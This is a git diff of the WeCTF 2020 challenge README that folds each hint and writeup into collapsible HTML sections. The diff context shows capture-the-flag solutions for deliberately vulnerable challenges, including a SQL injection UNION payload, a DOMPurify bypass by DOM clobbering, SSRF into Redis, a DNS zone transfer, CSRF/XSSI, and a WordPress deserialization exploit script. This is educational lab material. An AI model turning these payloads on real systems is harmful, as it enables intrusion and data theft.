@@ -31,7 +31,8 @@ Handout: https://github.com/wectf/2020p/blob/master/babyrev/babyrev.so
 
 Author: @qisu
 
-**Writeup**
+<details>
+<summary>Writeup</summary>
 
 The extension compares requests' user-agent with string "Flag Viewer 2.0".
 
@@ -39,6 +40,7 @@ PoC:
 ```bash
 curl -H "User-Agent: Flag Viewer 2.0" [HOST]
 ```
+</details>
 
 ## Red Team
 61 solves
@@ -52,7 +54,8 @@ His company's domain: shoustinycompany.cf (Challenge is down now)
 Note: You are allowed to use subdomain scanner in this challenge.
 
 
-**Writeup**
+<details>
+<summary>Writeup</summary>
 
 Step 1: Do a subdomain scan and you would discover `docs.shoustinycompany.cf`
 
@@ -82,7 +85,7 @@ Step 4: Perform AXFR transaction at `lookingglassv1.shoustinycompany.cf` by
 ```bash
 dig AXFR shoustinycompany.cf @ns1.shoustinycompany.cf
 ```
-
+</details>
 
 ## KVCloud 
 13 solves
@@ -93,7 +96,10 @@ Shou hates to use Redis by TCPing it. He instead built a HTTP wrapper for saving
 
 Flag is at /flag.txt.
 
-Hint: How to keep-alive a connection?
+<details>
+	<summary>Hint</summary>
+	How to keep-alive a connection?
+</details>
 
 Note 1: Remote is not using 127.0.0.1 as Redis host.
 
@@ -101,7 +107,8 @@ Note 2: Try different host if your payload is not working remotely.
 
 Handout: https://github.com/wectf/2020p/blob/master/kvcloud/handout.zip
 
-**Writeup**
+<details>
+<summary>Writeup</summary>
 
 SSRF with Connection: keep-alive:
 ```python3
@@ -119,7 +126,7 @@ c = get("http://[HOST]:%s/get?redis_port=%s&key=%s" % (port, port, payload)).con
 print(c)
 print("http://[HOST]:%s/get?redis_port=%s&key=%s" % (port, port, payload))
 ```
-
+</details>
 
 ## dont-bf-me 
 36 solves
@@ -128,14 +135,18 @@ print("http://[HOST]:%s/get?redis_port=%s&key=%s" % (port, port, payload))
 
 Shou uses Recaptcha for his site to make it "safer".
 
-Hint: The password is so long that makes any bruteforcing method impotent.
+<details>
+	<summary>Hint</summary>
+	The password is so long that makes any bruteforcing method impotent.
+</details>
 
 Handout: https://github.com/wectf/2020p/blob/master/dont-bf-me/handout.zip
 
-**Writeup**
+<details>
+<summary>Writeup</summary>
 
 `parse_str` in login.php could overwrite $RECAPTCHA_URL and $CORRECT_PASSWORD. 
-
+</details>
 
 ## Hashtable
 15 solves
@@ -148,7 +159,8 @@ Note: having 10 collisions at the same slot would give you the flag
 
 Handout: https://github.com/wectf/2020p/blob/master/hashtable/handout.zip
 
-**Writeup**
+<details>
+<summary>Writeup</summary>
 
 Pseudo Random Number PoC:
 
@@ -220,7 +232,7 @@ func main() {
 	}
 }
 ```
-
+</details>
 
 ## Hall of Fame
 22 solves
@@ -231,7 +243,8 @@ We made a Slack bot (@hof) to remember our past winners. Hope no one hacks it cu
 
 Handout: https://github.com/wectf/2020p/tree/master/hof
 
-**Writeup**
+<details>
+<summary>Writeup</summary>
 
 SQL Injection
 
@@ -239,6 +252,7 @@ Send following content to @hof would yield the flag:
 ```
 rank x') UNION SELECT 1,1,(SELECT flag from flags LIMIT 1) ---
 ```
+</details> 
 
 ## Notebin 
 8 solves
@@ -247,7 +261,8 @@ rank x') UNION SELECT 1,1,(SELECT flag from flags LIMIT 1) ---
 
 Here is where Shou keeps his pathetic diaries and a shinny flag.
 
-**Writeup**
+<details>
+<summary>Writeup</summary>
 
 DOM Clobbering => XSS
 
@@ -255,6 +270,7 @@ Set title as following could make content bypass DOMPurify.
 ```html
 <a id="_debug"></a><a id="_debug" name="key" href="sha1:f03e8a370aa8dc80f63a6d67401a692ae72fa530"></a>
 ```
+</details>
 
 ## Wallet
 4 solves
@@ -264,14 +280,20 @@ Set title as following could make content bypass DOMPurify.
 Shou has a habit of saving secret (i.e. flag) in the blockchain. Here is where he stores his bitcoin addresses.
 
 Note: wrap what you find on blockchain with we{.....}
+<details>
+	<summary>Hint 1</summary>
+	You should leak the bitcoin address in Shou's wallet first.
+</details>
 
-Hint 1: You should leak the bitcoin address in Shou's wallet first.
-
-Hint 2: Shou is using Firefox. Firefox does not have CORB.
+<details>
+	<summary>Hint 2</summary>
+	Shou is using Firefox. Firefox does not have CORB.
+</details>
 
 Handout: https://github.com/wectf/2020p/blob/master/wallet/handout.zip
 
-**Writeup**
+<details>
+<summary>Writeup</summary>
 CSRF + XSSI + Some recon
 
 0.html:
@@ -330,6 +352,7 @@ CSRF + XSSI + Some recon
 Save 0.html, 1.html, 2.html and send 2.html as payload. 
 
 After getting the bitcoin address, you can find flag in OP_RETURN of one transaction. 
+</details>
 
 ## Wordpress
 2 solves
@@ -342,8 +365,9 @@ Note 1: it is unnecessary to be admin to solve this challenge and to ensure the 
 
 Handout: https://github.com/wectf/2020p/blob/master/wordpress/handout.zip
 
-**Writeup**
-
+<details>
+<summary>Writeup</summary>
+	
 Wordpress Entry Overwrite + Unsafe Deserialization 
 ```python
 from requests import *
@@ -368,4 +392,5 @@ print(s.post(f"{HOST}wp-admin/admin.php?page=edit_upage", data={
 
 print(s.get(f"{HOST}wp-admin").text)
 ```
+</details>
 
